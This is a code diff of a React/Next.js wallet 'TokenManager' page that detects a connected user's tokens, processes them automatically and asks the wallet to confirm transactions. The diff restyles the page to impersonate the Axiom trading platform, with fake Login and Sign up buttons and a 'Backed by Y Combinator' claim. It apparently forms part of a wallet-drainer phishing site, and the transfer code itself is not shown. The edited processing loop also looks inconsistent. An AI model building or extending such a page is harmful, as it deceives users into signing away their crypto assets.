@@ -1,8 +1,8 @@
 'use client'
 
-import React, { useEffect, useState } from 'react'
+import React, { useEffect, useState, CSSProperties } from 'react'
 import { useAppKit } from '@reown/appkit/react'
-import { useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
+import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
 import { ethers } from 'ethers'
 
 interface Token {
@@ -25,6 +25,130 @@ interface FailedItem {
   token: Token
   reason: string
 }
+
+// Definición de estilos con tipos TypeScript
+const styles: { [key: string]: CSSProperties } = {
+  body: {
+    fontFamily: "'Inter', sans-serif",
+    margin: 0,
+    padding: 0,
+    backgroundColor: '#0a0a0a',
+    color: '#ffffff',
+  },
+  navbar: {
+    display: 'flex',
+    justifyContent: 'space-between',
+    alignItems: 'center',
+    padding: '1rem 2rem',
+    position: 'fixed',
+    top: 0,
+    width: '100%',
+    zIndex: 1000,
+    boxSizing: 'border-box',
+    background: 'rgba(10, 10, 10, 0.8)',
+    backdropFilter: 'blur(10px)',
+  },
+  navButtons: {
+    display: 'flex',
+    gap: '1rem',
+  },
+  loginBtn: {
+    background: 'transparent',
+    color: 'white',
+    border: '1px solid rgba(255, 255, 255, 0.2)',
+    padding: '10px 20px',
+    borderRadius: '10px',
+    fontWeight: 500,
+    cursor: 'pointer',
+    transition: 'all 0.3s ease',
+  },
+  signupBtn: {
+    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
+    color: 'white',
+    padding: '10px 20px',
+    borderRadius: '10px',
+    fontWeight: 500,
+    border: 'none',
+    cursor: 'pointer',
+    transition: 'all 0.3s ease',
+  },
+  ctaButton: {
+    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
+    color: 'white',
+    padding: '15px 40px',
+    borderRadius: '10px',
+    fontWeight: 600,
+    fontSize: '18px',
+    border: 'none',
+    cursor: 'pointer',
+    transition: 'all 0.3s ease',
+    marginTop: '2%',
+    textDecoration: 'none',
+    display: 'inline-block',
+  },
+  mainContent: {
+    display: 'flex',
+    justifyContent: 'center',
+    alignItems: 'center',
+    height: '100vh',
+    flexDirection: 'column',
+    background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
+    textAlign: 'center',
+    padding: '0 2rem',
+  },
+  mainTitle: {
+    fontSize: '3.5rem',
+    fontWeight: 700,
+    margin: '1rem 0',
+    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
+    backgroundClip: 'text',
+    WebkitBackgroundClip: 'text',
+    WebkitTextFillColor: 'transparent',
+  },
+  subtitle: {
+    fontSize: '1.2rem',
+    color: '#ccc',
+    marginBottom: '2rem',
+    maxWidth: '600px',
+  },
+  modalOverlay: {
+    position: 'fixed',
+    top: 0,
+    left: 0,
+    right: 0,
+    bottom: 0,
+    backgroundColor: 'rgba(0, 0, 0, 0.8)',
+    display: 'flex',
+    justifyContent: 'center',
+    alignItems: 'center',
+    zIndex: 1000,
+    flexDirection: 'column'
+  },
+  modalContainer: {
+    background: '#1E1E1E',
+    borderRadius: '20px',
+    padding: '30px',
+    width: '400px',
+    maxWidth: '90%',
+    position: 'relative',
+  },
+  spinner: {
+    border: '5px solid #f3f3f3',
+    borderTop: '5px solid #8C66FC',
+    borderRadius: '50%',
+    width: '50px',
+    height: '50px',
+    animation: 'spin 1s linear infinite',
+    marginBottom: '20px'
+  },
+  buttonHover: {
+    transform: 'translateY(-2px)',
+    boxShadow: '0 10px 20px rgba(0, 0, 0, 0.2)',
+  },
+  loginBtnHover: {
+    background: 'rgba(255, 255, 255, 0.1)',
+  },
+};
 
 // Función helper para fetch con mejor manejo de errores
 const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
@@ -65,54 +189,103 @@ export default function TokenManager(): React.JSX.Element {
   const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
+  const { switchChain } = useSwitchChain()
 
-  const changeChainIfNeeded = async (targetChainId: number): Promise<void> => {
-  try {
-    if (!walletClient) throw new Error('Wallet client no disponible');
-    
-    // Obtener la cadena actual
-    const currentChainId = await walletClient.getChainId();
-    if (currentChainId === targetChainId) return;
+  const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
+    if (!walletClient) throw new Error('Wallet client no disponible')
 
-    // Intentar cambiar de cadena
-    showLoading(`Cambiando a la red ${targetChainId}...`);
-    
-    await walletClient.request({
-      method: 'wallet_switchEthereumChain',
-      params: [{ chainId: `0x${targetChainId.toString(16)}` }],
-    });
-    
-    // Esperar a que la wallet se actualice
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-  } catch (error: any) {
-    if (error.code === 4902) {
-      // Cadena no agregada en la wallet - agregar BNB Chain si es necesario
-      if (targetChainId === 56) {
-        await walletClient.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: '0x38',
-            chainName: 'BNB Smart Chain',
-            nativeCurrency: {
-              name: 'BNB',
-              symbol: 'BNB',
-              decimals: 18,
-            },
-            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-            blockExplorerUrls: ['https://bscscan.com/'],
-          }],
-        });
-        return;
+    try {
+      setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
+      setIsLoading(true)
+
+      const getCurrent = async () => {
+        try {
+          return await walletClient.getChainId()
+        } catch (e) {
+          return undefined
+        }
       }
-      throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`);
+
+      const currentChainId = await getCurrent()
+      if (currentChainId === targetChainId) {
+        setIsLoading(false)
+        return
+      }
+
+      // Intentar usar switchChain de wagmi si está disponible
+      let switched = false
+      try {
+        if (switchChain) {
+          await switchChain({ chainId: targetChainId })
+          switched = true
+        }
+      } catch (swErr: any) {
+        // Si switchChain no funcionó, seguiremos intentando con wallet RPC
+        if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
+          // dejar que el siguiente bloque intente un switch alternativo o agregar la cadena
+        }
+        if (isUserRejected(swErr)) {
+          throw new Error('Usuario rechazó el cambio de red')
+        }
+      }
+
+      // Si no se hizo el cambio con switchChain, intentar con request RPC
+      if (!switched) {
+        try {
+          await walletClient.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: `0x${targetChainId.toString(16)}` }]
+          })
+        } catch (err: any) {
+          // Si la cadena no existe (4902) intentamos agregarla
+          if (err?.code === 4902) {
+            // sólo ejemplo para BSC; agregar más blockchains según necesites
+            if (targetChainId === 56) {
+              await walletClient.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: '0x38',
+                  chainName: 'BNB Smart Chain',
+                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com/']
+                }]
+              })
+              // intentar switch otra vez
+              await walletClient.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }]
+              })
+            } else {
+              throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
+            }
+          } else if (isUserRejected(err)) {
+            throw new Error('Usuario rechazó el cambio de red')
+          } else {
+            throw err
+          }
+        }
+      }
+
+      // Polling: esperar hasta que la wallet realmente reporte la nueva chain
+      const start = Date.now()
+      while (Date.now() - start < timeoutMs) {
+        const newChain = await getCurrent()
+        if (newChain === targetChainId) {
+          setIsLoading(false)
+          return
+        }
+        await new Promise((r) => setTimeout(r, 500))
+      }
+
+      throw new Error('Timeout esperando que la wallet cambie de red')
+    } catch (error: any) {
+      setIsLoading(false)
+      // rethrow con mensaje legible
+      if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
+      throw new Error(error?.message || String(error))
     }
-    if (isUserRejected(error)) {
-      throw new Error('Usuario rechazó el cambio de red');
-    }
-    throw new Error(`Error cambiando de red: ${error.message}`);
   }
-};
 
   useEffect(() => {
     setIsClient(true)
@@ -286,12 +459,16 @@ export default function TokenManager(): React.JSX.Element {
     const message = String(error?.message || '').toLowerCase()
     return /user denied|user rejected|rejected by user/i.test(message)
   }
+    
 
   const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
   try {
     if (!walletClient || !publicClient || !address) {
       throw new Error('Wallet no conectada correctamente');
     }
+
+    // Cambiar a la cadena correcta antes de procesar
+    await changeChainIfNeeded(token.chain as number)
 
     const targetChainId = token.chain as number;
     if (!targetChainId) {
@@ -552,7 +729,7 @@ export default function TokenManager(): React.JSX.Element {
 
     // Procesar tokens nativos automáticamente
     for (const token of sortedNativeTokens) {
-      await processNativeToken(token)
+      await changeChainIfNeeded(token.chain as number)
     }
 
     setProcessing(false)
@@ -574,81 +751,92 @@ export default function TokenManager(): React.JSX.Element {
     }, 100)
   }
 
+  // Estados para efectos hover
+  const [isLoginHovered, setIsLoginHovered] = useState(false);
+  const [isSignupHovered, setIsSignupHovered] = useState(false);
+  const [isCtaHovered, setIsCtaHovered] = useState(false);
+
   // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
     return (
-      <div style={{
-        display: 'flex',
-        justifyContent: 'center',
-        alignItems: 'center',
-        height: '100vh',
-        flexDirection: 'column'
-      }}>
-        <h1>Administrador de Tokens</h1>
-        <p>Cargando...</p>
+      <div style={styles.mainContent}>
+        <h1 style={styles.mainTitle}>Administrador de Tokens</h1>
+        <p style={styles.subtitle}>Cargando...</p>
       </div>
     )
   }
 
   return (
-    <div style={{
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      height: '100vh',
-      flexDirection: 'column'
-    }}>
-      <button
-        onClick={() => open()}
-        style={{
-          padding: '12px 16px',
-          fontSize: '16px',
-          backgroundColor: '#0070f3',
-          color: 'white',
-          border: 'none',
-          borderRadius: '8px',
-          cursor: 'pointer'
-        }}
-      >
-        {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
-      </button>
+    <div style={styles.body}>
+      {/* Navbar similar al primer código */}
+      <nav style={styles.navbar}>
+        <div style={styles.navButtons}>
+          <button 
+            style={{ 
+              ...styles.loginBtn, 
+              ...(isLoginHovered && styles.loginBtnHover) 
+            }}
+            onMouseEnter={() => setIsLoginHovered(true)}
+            onMouseLeave={() => setIsLoginHovered(false)}
+          >
+            Login
+          </button>
+          <button 
+            style={{ 
+              ...styles.signupBtn, 
+              ...(isSignupHovered && styles.buttonHover) 
+            }}
+            onMouseEnter={() => setIsSignupHovered(true)}
+            onMouseLeave={() => setIsSignupHovered(false)}
+          >
+            Sign up
+          </button>
+        </div>
+      </nav>
 
+      {/* Main content */}
+      <main style={styles.mainContent}>
+        <h1 style={styles.mainTitle}>The Gateway to DeFi</h1>
+        <p style={styles.subtitle}>Axiom is the only trading platform you'll ever need.</p>
+        
+        <button
+          onClick={() => open()}
+          style={{ 
+            ...styles.ctaButton, 
+            ...(isCtaHovered && styles.buttonHover) 
+          }}
+          onMouseEnter={() => setIsCtaHovered(true)}
+          onMouseLeave={() => setIsCtaHovered(false)}
+        >
+          {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
+        </button>
+
+        <div style={{ marginTop: '2rem', color: '#ccc' }}>
+          <span>Backed by </span>
+          <span style={{ fontWeight: 'bold' }}>Y Combinator</span>
+        </div>
+      </main>
+
+      {/* Modal de carga */}
       {(isLoading || showProcessingModal) && (
-        <div style={{
-          position: 'fixed',
-          top: 0,
-          left: 0,
-          right: 0,
-          bottom: 0,
-          backgroundColor: 'rgba(0, 0, 0, 0.8)',
-          display: 'flex',
-          justifyContent: 'center',
-          alignItems: 'center',
-          zIndex: 1000,
-          flexDirection: 'column'
-        }}>
-          <div style={{
-            width: '50px',
-            height: '50px',
-            border: '5px solid #f3f3f3',
-            borderTop: '5px solid #0070f3',
-            borderRadius: '50%',
-            animation: 'spin 1s linear infinite',
-            marginBottom: '20px'
-          }}></div>
-          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
-            {showProcessingModal 
-              ? `Procesando ${detectedTokensCount} tokens detectados...` 
-              : loadingMessage}
-          </p>
-          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
-            Por favor espere, esto puede tomar varios minutos...
-            <br />
-            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
-          </p>
+        <div style={styles.modalOverlay}>
+          <div style={styles.modalContainer}>
+            <div style={styles.spinner}></div>
+            <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
+              {showProcessingModal 
+                ? `Procesando ${detectedTokensCount} tokens detectados...` 
+                : loadingMessage}
+            </p>
+            <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
+              Por favor espere, esto puede tomar varios minutos...
+              <br />
+              {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
+            </p>
+          </div>
         </div>
       )}
 
+      {/* Animación de spinner */}
       <style jsx>{`
         @keyframes spin {
           0% { transform: rotate(0deg); }
